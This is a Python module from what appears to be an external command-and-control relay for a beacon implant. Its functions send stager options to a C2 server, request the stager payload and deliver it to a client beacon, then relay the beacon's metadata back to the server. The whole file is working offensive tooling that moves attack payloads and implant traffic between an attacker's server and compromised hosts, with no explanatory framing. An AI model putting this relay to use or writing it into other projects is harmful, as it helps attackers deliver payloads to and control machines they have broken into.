import config
from utils import commonUtils


def configureOptions(sock, arch, pipename, block):
    # This whole function should eventually be refactored into an elaborate for loop so that we can
    # support additional beacon options down the road
    # send the options
    if config.verbose:
        print(commonUtils.color("Configuring stager options"))

    beacon_arch = "arch=" + str(arch)
    if config.debug:
        print(commonUtils.color(beacon_arch, status=False, yellow=True))
    try:
        commonUtils.sendFrameToC2(sock, beacon_arch)
    except Exception as e:
        print(f'Error: {e}')
        
    beacon_pipename = "pipename=" + str(pipename)
    if config.debug:
        print(commonUtils.color(beacon_pipename, status=False, yellow=True))
    commonUtils.sendFrameToC2(sock, beacon_pipename)

    beacon_block = "block=" + str(block)
    if config.debug:
        print(commonUtils.color(beacon_block, status=False, yellow=True))
    commonUtils.sendFrameToC2(sock, beacon_block)


def requestStager(sock):
    try:
        commonUtils.sendFrameToC2(sock, "go")
        stager_payload = commonUtils.recvFrameFromC2(sock)
        return stager_payload
    except Exception as e:
        print(f'Error: {e}')

async def loadStager(sock, beaconId):
    # Send options to the external C2 server
    configureOptions(sock, config.C2_ARCH, config.C2_PIPE_NAME, config.C2_BLOCK_TIME)

    if config.debug:
        print(commonUtils.color("Stager configured, sending 'go'", status=False, yellow=True))

    # Request stager
    stager_payload = requestStager(sock)

    if config.debug:
        print(commonUtils.color("STAGER: ", status=False, yellow=True) + "%s" % stager_payload)

    # Prepare stager payload
    if config.verbose:
        print(commonUtils.color("Encoding stager payload"))
        # Trick, this is actually done during sendData()

    # Send stager to the client
    if config.verbose:
        print(commonUtils.color("Sending stager to client"))
    await commonUtils.sendData(stager_payload, beaconId)

    # Retrieve the metadata we need to relay back to the server
    if config.verbose:
        print(commonUtils.color("Awaiting metadata response from client"))
    
    # Await the asynchronous function 'retrieveData' since it's a coroutine
    metadata = (await commonUtils.retrieveData(beaconId))[0]

    # Send the metadata frame to the external C2 server
    if config.verbose:
        print(commonUtils.color("Sending metadata to C2 server"))
    if config.debug:
        print(commonUtils.color("METADATA: ", status=False, yellow=True) + "%s" % metadata)

    commonUtils.sendFrameToC2(sock, metadata)

    # Pretend we have error handling, return 0 if everything is good
    return 0

